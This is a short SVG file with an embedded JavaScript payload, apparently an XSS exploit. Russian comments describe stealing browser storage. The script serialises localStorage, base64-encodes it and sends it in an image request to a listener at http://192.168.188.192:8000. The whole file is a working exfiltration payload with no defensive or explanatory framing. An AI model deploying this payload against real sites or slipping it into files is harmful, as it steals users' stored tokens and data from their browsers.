<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    /* Пытаемся украсть Local Storage и Session Storage */
    var ls = JSON.stringify(localStorage);
    /* Кодируем в base64, чтобы спецсимволы не сломали ссылку */
    var data = btoa(ls); 
    
    /* Отправляем добычу */
    new Image().src = "http://192.168.188.192:8000/?storage=" + data;
  </script>
</svg>
